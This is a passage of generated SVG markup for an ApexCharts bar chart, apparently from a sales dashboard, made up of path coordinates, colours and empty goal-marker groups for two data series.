                                      pathFrom="M 84.74419642857143 107.34900000000002 L 84.74419642857143 53.310640000000014 C 84.74419642857143 50.810640000000014 87.24419642857143 48.310640000000014 89.74419642857143 48.310640000000014 L 89.74419642857143 48.310640000000014 C 92.02220982142856 48.310640000000014 94.30022321428571 50.810640000000014 94.30022321428571 53.310640000000014 L 94.30022321428571 107.34900000000002 C 94.30022321428571 109.84900000000002 91.80022321428571 112.34900000000002 89.30022321428571 112.34900000000002 L 89.30022321428571 112.34900000000002 C 87.02220982142856 112.34900000000002 84.74419642857143 109.84900000000002 84.74419642857143 107.34900000000002 Z  L 84.74419642857143 112.34900000000002 L 94.30022321428571 112.34900000000002 L 94.30022321428571 112.34900000000002 L 94.30022321428571 112.34900000000002 L 94.30022321428571 112.34900000000002 L 94.30022321428571 112.34900000000002 L 84.74419642857143 112.34900000000002 Z"
                                      cy="48.309640000000016"
                                      cx="122.2642857142857"
                                      j="2"
                                      val="57"
                                      barHeight="64.03836"
                                      barWidth="11.556026785714284"
                                    ></path>
                                    <path
                                      id="SvgjsPath3648"
                                      d="M 123.2642857142857 107.34900000000002 L 123.2642857142857 20.729720000000007 C 123.2642857142857 18.229720000000007 125.7642857142857 15.72972000000001 128.2642857142857 15.72972000000001 L 128.2642857142857 15.72972000000001 C 130.54229910714287 15.72972000000001 132.8203125 18.229720000000007 132.8203125 20.729720000000007 L 132.8203125 107.34900000000002 C 132.8203125 109.84900000000002 130.3203125 112.34900000000002 127.8203125 112.34900000000002 L 127.8203125 112.34900000000002 C 125.54229910714285 112.34900000000002 123.2642857142857 109.84900000000002 123.2642857142857 107.34900000000002 Z "
                                      fill="rgba(132,90,223, 1)"
                                      fill-opacity="1"
                                      stroke="rgba(132,90,223, 1)"
                                      stroke-opacity="1"
                                      stroke-linecap="round"
                                      stroke-width="2"
                                      stroke-dasharray="0"
                                      class="apexcharts-bar-area"
                                      index="0"
                                      clip-path="url(#gridRectMaskwu6x3dqj)"
                                      pathTo="M 123.2642857142857 107.34900000000002 L 123.2642857142857 20.729720000000007 C 123.2642857142857 18.229720000000007 125.7642857142857 15.72972000000001 128.2642857142857 15.72972000000001 L 128.2642857142857 15.72972000000001 C 130.54229910714287 15.72972000000001 132.8203125 18.229720000000007 132.8203125 20.729720000000007 L 132.8203125 107.34900000000002 C 132.8203125 109.84900000000002 130.3203125 112.34900000000002 127.8203125 112.34900000000002 L 127.8203125 112.34900000000002 C 125.54229910714285 112.34900000000002 123.2642857142857 109.84900000000002 123.2642857142857 107.34900000000002 Z "
                                      pathFrom="M 123.2642857142857 107.34900000000002 L 123.2642857142857 20.729720000000007 C 123.2642857142857 18.229720000000007 125.7642857142857 15.72972000000001 128.2642857142857 15.72972000000001 L 128.2642857142857 15.72972000000001 C 130.54229910714287 15.72972000000001 132.8203125 18.229720000000007 132.8203125 20.729720000000007 L 132.8203125 107.34900000000002 C 132.8203125 109.84900000000002 130.3203125 112.34900000000002 127.8203125 112.34900000000002 L 127.8203125 112.34900000000002 C 125.54229910714285 112.34900000000002 123.2642857142857 109.84900000000002 123.2642857142857 107.34900000000002 Z  L 123.2642857142857 112.34900000000002 L 132.8203125 112.34900000000002 L 132.8203125 112.34900000000002 L 132.8203125 112.34900000000002 L 132.8203125 112.34900000000002 L 132.8203125 112.34900000000002 L 123.2642857142857 112.34900000000002 Z"
                                      cy="15.72872000000001"
                                      cx="160.78437499999998"
                                      j="3"
                                      val="86"
                                      barHeight="96.61928"
                                      barWidth="11.556026785714284"
                                    ></path>
                                    <path
                                      id="SvgjsPath3650"
                                      d="M 161.78437499999998 107.34900000000002 L 161.78437499999998 52.18716000000001 C 161.78437499999998 49.68716000000001 164.28437499999998 47.18716000000001 166.78437499999998 47.18716000000001 L 166.78437499999998 47.18716000000001 C 169.06238839285714 47.18716000000001 171.34040178571428 49.68716000000001 171.34040178571428 52.18716000000001 L 171.34040178571428 107.34900000000002 C 171.34040178571428 109.84900000000002 168.84040178571428 112.34900000000002 166.34040178571428 112.34900000000002 L 166.34040178571428 112.34900000000002 C 164.06238839285714 112.34900000000002 161.78437499999998 109.84900000000002 161.78437499999998 107.34900000000002 Z "
                                      fill="rgba(132,90,223, 1)"
                                      fill-opacity="1"
                                      stroke="rgba(132,90,223, 1)"
                                      stroke-opacity="1"
                                      stroke-linecap="round"
                                      stroke-width="2"
                                      stroke-dasharray="0"
                                      class="apexcharts-bar-area"
                                      index="0"
                                      clip-path="url(#gridRectMaskwu6x3dqj)"
                                      pathTo="M 161.78437499999998 107.34900000000002 L 161.78437499999998 52.18716000000001 C 161.78437499999998 49.68716000000001 164.28437499999998 47.18716000000001 166.78437499999998 47.18716000000001 L 166.78437499999998 47.18716000000001 C 169.06238839285714 47.18716000000001 171.34040178571428 49.68716000000001 171.34040178571428 52.18716000000001 L 171.34040178571428 107.34900000000002 C 171.34040178571428 109.84900000000002 168.84040178571428 112.34900000000002 166.34040178571428 112.34900000000002 L 166.34040178571428 112.34900000000002 C 164.06238839285714 112.34900000000002 161.78437499999998 109.84900000000002 161.78437499999998 107.34900000000002 Z "
                                      pathFrom="M 161.78437499999998 107.34900000000002 L 161.78437499999998 52.18716000000001 C 161.78437499999998 49.68716000000001 164.28437499999998 47.18716000000001 166.78437499999998 47.18716000000001 L 166.78437499999998 47.18716000000001 C 169.06238839285714 47.18716000000001 171.34040178571428 49.68716000000001 171.34040178571428 52.18716000000001 L 171.34040178571428 107.34900000000002 C 171.34040178571428 109.84900000000002 168.84040178571428 112.34900000000002 166.34040178571428 112.34900000000002 L 166.34040178571428 112.34900000000002 C 164.06238839285714 112.34900000000002 161.78437499999998 109.84900000000002 161.78437499999998 107.34900000000002 Z  L 161.78437499999998 112.34900000000002 L 171.34040178571428 112.34900000000002 L 171.34040178571428 112.34900000000002 L 171.34040178571428 112.34900000000002 L 171.34040178571428 112.34900000000002 L 171.34040178571428 112.34900000000002 L 161.78437499999998 112.34900000000002 Z"
                                      cy="47.186160000000015"
                                      cx="199.30446428571426"
                                      j="4"
                                      val="58"
                                      barHeight="65.16184"
                                      barWidth="11.556026785714284"
                                    ></path>
                                    <path
                                      id="SvgjsPath3652"
                                      d="M 200.30446428571426 107.34900000000002 L 200.30446428571426 55.55760000000001 C 200.30446428571426 53.05760000000001 202.80446428571426 50.55760000000001 205.30446428571426 50.55760000000001 L 205.30446428571426 50.55760000000001 C 207.58247767857142 50.55760000000001 209.86049107142856 53.05760000000001 209.86049107142856 55.55760000000001 L 209.86049107142856 107.34900000000002 C 209.86049107142856 109.84900000000002 207.36049107142856 112.34900000000002 204.86049107142856 112.34900000000002 L 204.86049107142856 112.34900000000002 C 202.58247767857142 112.34900000000002 200.30446428571426 109.84900000000002 200.30446428571426 107.34900000000002 Z "
                                      fill="rgba(132,90,223, 1)"
                                      fill-opacity="1"
                                      stroke="rgba(132,90,223, 1)"
                                      stroke-opacity="1"
                                      stroke-linecap="round"
                                      stroke-width="2"
                                      stroke-dasharray="0"
                                      class="apexcharts-bar-area"
                                      index="0"
                                      clip-path="url(#gridRectMaskwu6x3dqj)"
                                      pathTo="M 200.30446428571426 107.34900000000002 L 200.30446428571426 55.55760000000001 C 200.30446428571426 53.05760000000001 202.80446428571426 50.55760000000001 205.30446428571426 50.55760000000001 L 205.30446428571426 50.55760000000001 C 207.58247767857142 50.55760000000001 209.86049107142856 53.05760000000001 209.86049107142856 55.55760000000001 L 209.86049107142856 107.34900000000002 C 209.86049107142856 109.84900000000002 207.36049107142856 112.34900000000002 204.86049107142856 112.34900000000002 L 204.86049107142856 112.34900000000002 C 202.58247767857142 112.34900000000002 200.30446428571426 109.84900000000002 200.30446428571426 107.34900000000002 Z "
                                      pathFrom="M 200.30446428571426 107.34900000000002 L 200.30446428571426 55.55760000000001 C 200.30446428571426 53.05760000000001 202.80446428571426 50.55760000000001 205.30446428571426 50.55760000000001 L 205.30446428571426 50.55760000000001 C 207.58247767857142 50.55760000000001 209.86049107142856 53.05760000000001 209.86049107142856 55.55760000000001 L 209.86049107142856 107.34900000000002 C 209.86049107142856 109.84900000000002 207.36049107142856 112.34900000000002 204.86049107142856 112.34900000000002 L 204.86049107142856 112.34900000000002 C 202.58247767857142 112.34900000000002 200.30446428571426 109.84900000000002 200.30446428571426 107.34900000000002 Z  L 200.30446428571426 112.34900000000002 L 209.86049107142856 112.34900000000002 L 209.86049107142856 112.34900000000002 L 209.86049107142856 112.34900000000002 L 209.86049107142856 112.34900000000002 L 209.86049107142856 112.34900000000002 L 200.30446428571426 112.34900000000002 Z"
                                      cy="50.55660000000001"
                                      cx="237.82455357142854"
                                      j="5"
                                      val="55"
                                      barHeight="61.7914"
                                      barWidth="11.556026785714284"
                                    ></path>
                                    <path
                                      id="SvgjsPath3654"
                                      d="M 238.82455357142854 107.34900000000002 L 238.82455357142854 38.705400000000004 C 238.82455357142854 36.205400000000004 241.32455357142854 33.705400000000004 243.82455357142854 33.705400000000004 L 243.82455357142854 33.705400000000004 C 246.1025669642857 33.705400000000004 248.38058035714283 36.205400000000004 248.38058035714283 38.705400000000004 L 248.38058035714283 107.34900000000002 C 248.38058035714283 109.84900000000002 245.88058035714283 112.34900000000002 243.38058035714283 112.34900000000002 L 243.38058035714283 112.34900000000002 C 241.1025669642857 112.34900000000002 238.82455357142854 109.84900000000002 238.82455357142854 107.34900000000002 Z "
                                      fill="rgba(132,90,223, 1)"
                                      fill-opacity="1"
                                      stroke="rgba(132,90,223, 1)"
                                      stroke-opacity="1"
                                      stroke-linecap="round"
                                      stroke-width="2"
                                      stroke-dasharray="0"
                                      class="apexcharts-bar-area"
                                      index="0"
                                      clip-path="url(#gridRectMaskwu6x3dqj)"
                                      pathTo="M 238.82455357142854 107.34900000000002 L 238.82455357142854 38.705400000000004 C 238.82455357142854 36.205400000000004 241.32455357142854 33.705400000000004 243.82455357142854 33.705400000000004 L 243.82455357142854 33.705400000000004 C 246.1025669642857 33.705400000000004 248.38058035714283 36.205400000000004 248.38058035714283 38.705400000000004 L 248.38058035714283 107.34900000000002 C 248.38058035714283 109.84900000000002 245.88058035714283 112.34900000000002 243.38058035714283 112.34900000000002 L 243.38058035714283 112.34900000000002 C 241.1025669642857 112.34900000000002 238.82455357142854 109.84900000000002 238.82455357142854 107.34900000000002 Z "
                                      pathFrom="M 238.82455357142854 107.34900000000002 L 238.82455357142854 38.705400000000004 C 238.82455357142854 36.205400000000004 241.32455357142854 33.705400000000004 243.82455357142854 33.705400000000004 L 243.82455357142854 33.705400000000004 C 246.1025669642857 33.705400000000004 248.38058035714283 36.205400000000004 248.38058035714283 38.705400000000004 L 248.38058035714283 107.34900000000002 C 248.38058035714283 109.84900000000002 245.88058035714283 112.34900000000002 243.38058035714283 112.34900000000002 L 243.38058035714283 112.34900000000002 C 241.1025669642857 112.34900000000002 238.82455357142854 109.84900000000002 238.82455357142854 107.34900000000002 Z  L 238.82455357142854 112.34900000000002 L 248.38058035714283 112.34900000000002 L 248.38058035714283 112.34900000000002 L 248.38058035714283 112.34900000000002 L 248.38058035714283 112.34900000000002 L 248.38058035714283 112.34900000000002 L 238.82455357142854 112.34900000000002 Z"
                                      cy="33.70440000000001"
                                      cx="276.34464285714284"
                                      j="6"
                                      val="70"
                                      barHeight="78.6436"
                                      barWidth="11.556026785714284"
                                    ></path>
                                    <g
                                      id="SvgjsG3639"
                                      class="apexcharts-bar-goals-markers"
                                    >
                                      <g
                                        id="SvgjsG3641"
                                        className="apexcharts-bar-goals-groups"
                                        class="apexcharts-hidden-element-shown"
                                        clip-path="url(#gridRectMarkerMaskwu6x3dqj)"
                                      ></g>
                                      <g
                                        id="SvgjsG3643"
                                        className="apexcharts-bar-goals-groups"
                                        class="apexcharts-hidden-element-shown"
                                        clip-path="url(#gridRectMarkerMaskwu6x3dqj)"
                                      ></g>
                                      <g
                                        id="SvgjsG3645"
                                        className="apexcharts-bar-goals-groups"
                                        class="apexcharts-hidden-element-shown"
                                        clip-path="url(#gridRectMarkerMaskwu6x3dqj)"
                                      ></g>
                                      <g
                                        id="SvgjsG3647"
                                        className="apexcharts-bar-goals-groups"
                                        class="apexcharts-hidden-element-shown"
                                        clip-path="url(#gridRectMarkerMaskwu6x3dqj)"
                                      ></g>
                                      <g
                                        id="SvgjsG3649"
                                        className="apexcharts-bar-goals-groups"
                                        class="apexcharts-hidden-element-shown"
                                        clip-path="url(#gridRectMarkerMaskwu6x3dqj)"
                                      ></g>
                                      <g
                                        id="SvgjsG3651"
                                        className="apexcharts-bar-goals-groups"
                                        class="apexcharts-hidden-element-shown"
                                        clip-path="url(#gridRectMarkerMaskwu6x3dqj)"
                                      ></g>
                                      <g
                                        id="SvgjsG3653"
                                        className="apexcharts-bar-goals-groups"
                                        class="apexcharts-hidden-element-shown"
                                        clip-path="url(#gridRectMarkerMaskwu6x3dqj)"
                                      ></g>
                                    </g>
                                    <g
                                      id="SvgjsG3640"
                                      class="apexcharts-bar-shadows apexcharts-hidden-element-shown"
                                    ></g>
                                  </g>
                                  <g
                                    id="SvgjsG3655"
                                    class="apexcharts-series"
                                    rel="2"
                                    seriesName="TotalxSales"
                                    data:realIndex="1"
                                  >
                                    <path
                                      id="SvgjsPath3660"
                                      d="M 19.260044642857142 107.34900000000002 L 19.260044642857142 79.15068000000002 C 19.260044642857142 76.65068000000002 21.760044642857142 74.15068000000002 24.260044642857142 74.15068000000002 L 24.260044642857142 74.15068000000002 C 26.538058035714286 74.15068000000002 28.816071428571426 76.65068000000002 28.816071428571426 79.15068000000002 L 28.816071428571426 107.34900000000002 C 28.816071428571426 109.84900000000002 26.316071428571426 112.34900000000002 23.816071428571426 112.34900000000002 L 23.816071428571426 112.34900000000002 C 21.538058035714286 112.34900000000002 19.260044642857142 109.84900000000002 19.260044642857142 107.34900000000002 Z "
                                      fill="rgba(237,237,237,0.85)"
                                      fill-opacity="1"
                                      stroke="#ededed"
                                      stroke-opacity="1"
                                      stroke-linecap="round"
                                      stroke-width="2"
                                      stroke-dasharray="0"
                                      class="apexcharts-bar-area"
                                      index="1"
                                      clip-path="url(#gridRectMaskwu6x3dqj)"
                                      pathTo="M 19.260044642857142 107.34900000000002 L 19.260044642857142 79.15068000000002 C 19.260044642857142 76.65068000000002 21.760044642857142 74.15068000000002 24.260044642857142 74.15068000000002 L 24.260044642857142 74.15068000000002 C 26.538058035714286 74.15068000000002 28.816071428571426 76.65068000000002 28.816071428571426 79.15068000000002 L 28.816071428571426 107.34900000000002 C 28.816071428571426 109.84900000000002 26.316071428571426 112.34900000000002 23.816071428571426 112.34900000000002 L 23.816071428571426 112.34900000000002 C 21.538058035714286 112.34900000000002 19.260044642857142 109.84900000000002 19.260044642857142 107.34900000000002 Z "
                                      pathFrom="M 19.260044642857142 107.34900000000002 L 19.260044642857142 79.15068000000002 C 19.260044642857142 76.65068000000002 21.760044642857142 74.15068000000002 24.260044642857142 74.15068000000002 L 24.260044642857142 74.15068000000002 C 26.538058035714286 74.15068000000002 28.816071428571426 76.65068000000002 28.816071428571426 79.15068000000002 L 28.816071428571426 107.34900000000002 C 28.816071428571426 109.84900000000002 26.316071428571426 112.34900000000002 23.816071428571426 112.34900000000002 L 23.816071428571426 112.34900000000002 C 21.538058035714286 112.34900000000002 19.260044642857142 109.84900000000002 19.260044642857142 107.34900000000002 Z  L 19.260044642857142 112.34900000000002 L 28.816071428571426 112.34900000000002 L 28.816071428571426 112.34900000000002 L 28.816071428571426 112.34900000000002 L 28.816071428571426 112.34900000000002 L 28.816071428571426 112.34900000000002 L 19.260044642857142 112.34900000000002 Z"
                                      cy="74.14968000000002"
                                      cx="56.78013392857143"
                                      j="0"
                                      val="34"
                                      barHeight="38.19832"
                                      barWidth="11.556026785714284"
                                    ></path>
                                    <path
                                      id="SvgjsPath3662"
                                      d="M 57.78013392857143 107.34900000000002 L 57.78013392857143 92.63244000000002 C 57.78013392857143 90.13244000000002 60.28013392857143 87.63244000000002 62.78013392857143 87.63244000000002 L 62.78013392857143 87.63244000000002 C 65.05814732142858 87.63244000000002 67.33616071428571 90.13244000000002 67.33616071428571 92.63244000000002 L 67.33616071428571 107.34900000000002 C 67.33616071428571 109.84900000000002 64.83616071428571 112.34900000000002 62.33616071428571 112.34900000000002 L 62.33616071428571 112.34900000000002 C 60.05814732142857 112.34900000000002 57.78013392857143 109.84900000000002 57.78013392857143 107.34900000000002 Z "
                                      fill="rgba(237,237,237,0.85)"
                                      fill-opacity="1"
                                      stroke="#ededed"
                                      stroke-opacity="1"
                                      stroke-linecap="round"
                                      stroke-width="2"
                                      stroke-dasharray="0"
                                      class="apexcharts-bar-area"
                                      index="1"
                                      clip-path="url(#gridRectMaskwu6x3dqj)"
                                      pathTo="M 57.78013392857143 107.34900000000002 L 57.78013392857143 92.63244000000002 C 57.78013392857143 90.13244000000002 60.28013392857143 87.63244000000002 62.78013392857143 87.63244000000002 L 62.78013392857143 87.63244000000002 C 65.05814732142858 87.63244000000002 67.33616071428571 90.13244000000002 67.33616071428571 92.63244000000002 L 67.33616071428571 107.34900000000002 C 67.33616071428571 109.84900000000002 64.83616071428571 112.34900000000002 62.33616071428571 112.34900000000002 L 62.33616071428571 112.34900000000002 C 60.05814732142857 112.34900000000002 57.78013392857143 109.84900000000002 57.78013392857143 107.34900000000002 Z "
                                      pathFrom="M 57.78013392857143 107.34900000000002 L 57.78013392857143 92.63244000000002 C 57.78013392857143 90.13244000000002 60.28013392857143 87.63244000000002 62.78013392857143 87.63244000000002 L 62.78013392857143 87.63244000000002 C 65.05814732142858 87.63244000000002 67.33616071428571 90.13244000000002 67.33616071428571 92.63244000000002 L 67.33616071428571 107.34900000000002 C 67.33616071428571 109.84900000000002 64.83616071428571 112.34900000000002 62.33616071428571 112.34900000000002 L 62.33616071428571 112.34900000000002 C 60.05814732142857 112.34900000000002 57.78013392857143 109.84900000000002 57.78013392857143 107.34900000000002 Z  L 57.78013392857143 112.34900000000002 L 67.33616071428571 112.34900000000002 L 67.33616071428571 112.34900000000002 L 67.33616071428571 112.34900000000002 L 67.33616071428571 112.34900000000002 L 67.33616071428571 112.34900000000002 L 57.78013392857143 112.34900000000002 Z"
                                      cy="87.63144000000001"
                                      cx="95.30022321428571"
                                      j="1"
                                      val="22"
                                      barHeight="24.71656"
                                      barWidth="11.556026785714284"
                                    ></path>
                                    <path
                                      id="SvgjsPath3664"
                                      d="M 96.30022321428571 107.34900000000002 L 96.30022321428571 75.78024000000002 C 96.30022321428571 73.28024000000002 98.80022321428571 70.78024000000002 101.30022321428571 70.78024000000002 L 101.30022321428571 70.78024000000002 C 103.57823660714286 70.78024000000002 105.85624999999999 73.28024000000002 105.85624999999999 75.78024000000002 L 105.85624999999999 107.34900000000002 C 105.85624999999999 109.84900000000002 103.35624999999999 112.34900000000002 100.85624999999999 112.34900000000002 L 100.85624999999999 112.34900000000002 C 98.57823660714286 112.34900000000002 96.30022321428571 109.84900000000002 96.30022321428571 107.34900000000002 Z "
                                      fill="rgba(237,237,237,0.85)"
                                      fill-opacity="1"
                                      stroke="#ededed"
                                      stroke-opacity="1"
                                      stroke-linecap="round"
                                      stroke-width="2"
                                      stroke-dasharray="0"
                                      class="apexcharts-bar-area"
                                      index="1"
                                      clip-path="url(#gridRectMaskwu6x3dqj)"
                                      pathTo="M 96.30022321428571 107.34900000000002 L 96.30022321428571 75.78024000000002 C 96.30022321428571 73.28024000000002 98.80022321428571 70.78024000000002 101.30022321428571 70.78024000000002 L 101.30022321428571 70.78024000000002 C 103.57823660714286 70.78024000000002 105.85624999999999 73.28024000000002 105.85624999999999 75.78024000000002 L 105.85624999999999 107.34900000000002 C 105.85624999999999 109.84900000000002 103.35624999999999 112.34900000000002 100.85624999999999 112.34900000000002 L 100.85624999999999 112.34900000000002 C 98.57823660714286 112.34900000000002 96.30022321428571 109.84900000000002 96.30022321428571 107.34900000000002 Z "
                                      pathFrom="M 96.30022321428571 107.34900000000002 L 96.30022321428571 75.78024000000002 C 96.30022321428571 73.28024000000002 98.80022321428571 70.78024000000002 101.30022321428571 70.78024000000002 L 101.30022321428571 70.78024000000002 C 103.57823660714286 70.78024000000002 105.85624999999999 73.28024000000002 105.85624999999999 75.78024000000002 L 105.85624999999999 107.34900000000002 C 105.85624999999999 109.84900000000002 103.35624999999999 112.34900000000002 100.85624999999999 112.34900000000002 L 100.85624999999999 112.34900000000002 C 98.57823660714286 112.34900000000002 96.30022321428571 109.84900000000002 96.30022321428571 107.34900000000002 Z  L 96.30022321428571 112.34900000000002 L 105.85624999999999 112.34900000000002 L 105.85624999999999 112.34900000000002 L 105.85624999999999 112.34900000000002 L 105.85624999999999 112.34900000000002 L 105.85624999999999 112.34900000000002 L 96.30022321428571 112.34900000000002 Z"
                                      cy="70.77924000000002"
                                      cx="133.8203125"
                                      j="2"
                                      val="37"
                                      barHeight="41.568760000000005"
                                      barWidth="11.556026785714284"
                                    ></path>
                                    <path
                                      id="SvgjsPath3666"
                                      d="M 134.8203125 107.34900000000002 L 134.8203125 54.43412000000001 C 134.8203125 51.93412000000001 137.3203125 49.43412000000001 139.8203125 49.43412000000001 L 139.8203125 49.43412000000001 C 142.09832589285713 49.43412000000001 144.3763392857143 51.93412000000001 144.3763392857143 54.43412000000001 L 144.3763392857143 107.34900000000002 C 144.3763392857143 109.84900000000002 141.8763392857143 112.34900000000002 139.3763392857143 112.34900000000002 L 139.3763392857143 112.34900000000002 C 137.09832589285713 112.34900000000002 134.8203125 109.84900000000002 134.8203125 107.34900000000002 Z "
                                      fill="rgba(237,237,237,0.85)"
                                      fill-opacity="1"
                                      stroke="#ededed"
                                      stroke-opacity="1"
                                      stroke-linecap="round"
                                      stroke-width="2"
                                      stroke-dasharray="0"
                                      class="apexcharts-bar-area"
                                      index="1"
                                      clip-path="url(#gridRectMaskwu6x3dqj)"
                                      pathTo="M 134.8203125 107.34900000000002 L 134.8203125 54.43412000000001 C 134.8203125 51.93412000000001 137.3203125 49.43412000000001 139.8203125 49.43412000000001 L 139.8203125 49.43412000000001 C 142.09832589285713 49.43412000000001 144.3763392857143 51.93412000000001 144.3763392857143 54.43412000000001 L 144.3763392857143 107.34900000000002 C 144.3763392857143 109.84900000000002 141.8763392857143 112.34900000000002 139.3763392857143 112.34900000000002 L 139.3763392857143 112.34900000000002 C 137.09832589285713 112.34900000000002 134.8203125 109.84900000000002 134.8203125 107.34900000000002 Z "
                                      pathFrom="M 134.8203125 107.34900000000002 L 134.8203125 54.43412000000001 C 134.8203125 51.93412000000001 137.3203125 49.43412000000001 139.8203125 49.43412000000001 L 139.8203125 49.43412000000001 C 142.09832589285713 49.43412000000001 144.3763392857143 51.93412000000001 144.3763392857143 54.43412000000001 L 144.3763392857143 107.34900000000002 C 144.3763392857143 109.84900000000002 141.8763392857143 112.34900000000002 139.3763392857143 112.34900000000002 L 139.3763392857143 112.34900000000002 C 137.09832589285713 112.34900000000002 134.8203125 109.84900000000002 134.8203125 107.34900000000002 Z  L 134.8203125 112.34900000000002 L 144.3763392857143 112.34900000000002 L 144.3763392857143 112.34900000000002 L 144.3763392857143 112.34900000000002 L 144.3763392857143 112.34900000000002 L 144.3763392857143 112.34900000000002 L 134.8203125 112.34900000000002 Z"
                                      cy="49.43312000000001"
                                      cx="172.34040178571428"
                                      j="3"
                                      val="56"
                                      barHeight="62.914880000000004"
                                      barWidth="11.556026785714284"
                                    ></path>
                                    <path
                                      id="SvgjsPath3668"
                                      d="M 173.34040178571428 107.34900000000002 L 173.34040178571428 93.75592000000002 C 173.34040178571428 91.25592000000002 175.84040178571428 88.75592000000002 178.34040178571428 88.75592000000002 L 178.34040178571428 88.75592000000002 C 180.6184151785714 88.75592000000002 182.89642857142857 91.25592000000002 182.89642857142857 93.75592000000002 L 182.89642857142857 107.34900000000002 C 182.89642857142857 109.84900000000002 180.39642857142857 112.34900000000002 177.89642857142857 112.34900000000002 L 177.89642857142857 112.34900000000002 C 175.6184151785714 112.34900000000002 173.34040178571428 109.84900000000002 173.34040178571428 107.34900000000002 Z "
                                      fill="rgba(237,237,237,0.85)"
                                      fill-opacity="1"
                                      stroke="#ededed"
                                      stroke-opacity="1"
                                      stroke-linecap="round"
                                      stroke-width="2"
                                      stroke-dasharray="0"
                                      class="apexcharts-bar-area"
                                      index="1"
                                      clip-path="url(#gridRectMaskwu6x3dqj)"
                                      pathTo="M 173.34040178571428 107.34900000000002 L 173.34040178571428 93.75592000000002 C 173.34040178571428 91.25592000000002 175.84040178571428 88.75592000000002 178.34040178571428 88.75592000000002 L 178.34040178571428 88.75592000000002 C 180.6184151785714 88.75592000000002 182.89642857142857 91.25592000000002 182.89642857142857 93.75592000000002 L 182.89642857142857 107.34900000000002 C 182.89642857142857 109.84900000000002 180.39642857142857 112.34900000000002 177.89642857142857 112.34900000000002 L 177.89642857142857 112.34900000000002 C 175.6184151785714 112.34900000000002 173.34040178571428 109.84900000000002 173.34040178571428 107.34900000000002 Z "
                                      pathFrom="M 173.34040178571428 107.34900000000002 L 173.34040178571428 93.75592000000002 C 173.34040178571428 91.25592000000002 175.84040178571428 88.75592000000002 178.34040178571428 88.75592000000002 L 178.34040178571428 88.75592000000002 C 180.6184151785714 88.75592000000002 182.89642857142857 91.25592000000002 182.89642857142857 93.75592000000002 L 182.89642857142857 107.34900000000002 C 182.89642857142857 109.84900000000002 180.39642857142857 112.34900000000002 177.89642857142857 112.34900000000002 L 177.89642857142857 112.34900000000002 C 175.6184151785714 112.34900000000002 173.34040178571428 109.84900000000002 173.34040178571428 107.34900000000002 Z  L 173.34040178571428 112.34900000000002 L 182.89642857142857 112.34900000000002 L 182.89642857142857 112.34900000000002 L 182.89642857142857 112.34900000000002 L 182.89642857142857 112.34900000000002 L 182.89642857142857 112.34900000000002 L 173.34040178571428 112.34900000000002 Z"
                                      cy="88.75492000000001"
                                      cx="210.86049107142856"
                                      j="4"
                                      val="21"
                                      barHeight="23.59308"
                                      barWidth="11.556026785714284"
                                    ></path>
                                    <path
                                      id="SvgjsPath3670"
                                      d="M 211.86049107142856 107.34900000000002 L 211.86049107142856 78.02720000000002 C 211.86049107142856 75.52720000000002 214.36049107142856 73.02720000000002 216.86049107142856 73.02720000000002 L 216.86049107142856 73.02720000000002 C 219.1385044642857 73.02720000000002 221.41651785714285 75.52720000000002 221.41651785714285 78.02720000000002 L 221.41651785714285 107.34900000000002 C 221.41651785714285 109.84900000000002 218.91651785714285 112.34900000000002 216.41651785714285 112.34900000000002 L 216.41651785714285 112.34900000000002 C 214.1385044642857 112.34900000000002 211.86049107142856 109.84900000000002 211.86049107142856 107.34900000000002 Z "
                                      fill="rgba(237,237,237,0.85)"
                                      fill-opacity="1"
                                      stroke="#ededed"
                                      stroke-opacity="1"
                                      stroke-linecap="round"
                                      stroke-width="2"
                                      stroke-dasharray="0"
                                      class="apexcharts-bar-area"
                                      index="1"
                                      clip-path="url(#gridRectMaskwu6x3dqj)"
                                      pathTo="M 211.86049107142856 107.34900000000002 L 211.86049107142856 78.02720000000002 C 211.86049107142856 75.52720000000002 214.36049107142856 73.02720000000002 216.86049107142856 73.02720000000002 L 216.86049107142856 73.02720000000002 C 219.1385044642857 73.02720000000002 221.41651785714285 75.52720000000002 221.41651785714285 78.02720000000002 L 221.41651785714285 107.34900000000002 C 221.41651785714285 109.84900000000002 218.91651785714285 112.34900000000002 216.41651785714285 112.34900000000002 L 216.41651785714285 112.34900000000002 C 214.1385044642857 112.34900000000002 211.86049107142856 109.84900000000002 211.86049107142856 107.34900000000002 Z "
                                      pathFrom="M 211.86049107142856 107.34900000000002 L 211.86049107142856 78.02720000000002 C 211.86049107142856 75.52720000000002 214.36049107142856 73.02720000000002 216.86049107142856 73.02720000000002 L 216.86049107142856 73.02720000000002 C 219.1385044642857 73.02720000000002 221.41651785714285 75.52720000000002 221.41651785714285 78.02720000000002 L 221.41651785714285 107.34900000000002 C 221.41651785714285 109.84900000000002 218.91651785714285 112.34900000000002 216.41651785714285 112.34900000000002 L 216.41651785714285 112.34900000000002 C 214.1385044642857 112.34900000000002 211.86049107142856 109.84900000000002 211.86049107142856 107.34900000000002 Z  L 211.86049107142856 112.34900000000002 L 221.41651785714285 112.34900000000002 L 221.41651785714285 112.34900000000002 L 221.41651785714285 112.34900000000002 L 221.41651785714285 112.34900000000002 L 221.41651785714285 112.34900000000002 L 211.86049107142856 112.34900000000002 Z"
                                      cy="73.02620000000002"
                                      cx="249.38058035714283"
                                      j="5"
                                      val="35"
                                      barHeight="39.3218"
                                      barWidth="11.556026785714284"
                                    ></path>
                                    <path
                                      id="SvgjsPath3672"
                                      d="M 250.38058035714283 107.34900000000002 L 250.38058035714283 49.94020000000001 C 250.38058035714283 47.44020000000001 252.88058035714283 44.94020000000001 255.38058035714283 44.94020000000001 L 255.38058035714283 44.94020000000001 C 257.65859374999997 44.94020000000001 259.9366071428571 47.44020000000001 259.9366071428571 49.94020000000001 L 259.9366071428571 107.34900000000002 C 259.9366071428571 109.84900000000002 257.4366071428571 112.34900000000002 254.9366071428571 112.34900000000002 L 254.9366071428571 112.34900000000002 C 252.65859374999997 112.34900000000002 250.38058035714283 109.84900000000002 250.38058035714283 107.34900000000002 Z "
                                      fill="rgba(237,237,237,0.85)"
                                      fill-opacity="1"
                                      stroke="#ededed"
                                      stroke-opacity="1"
                                      stroke-linecap="round"
                                      stroke-width="2"
                                      stroke-dasharray="0"
                                      class="apexcharts-bar-area"
                                      index="1"
                                      clip-path="url(#gridRectMaskwu6x3dqj)"
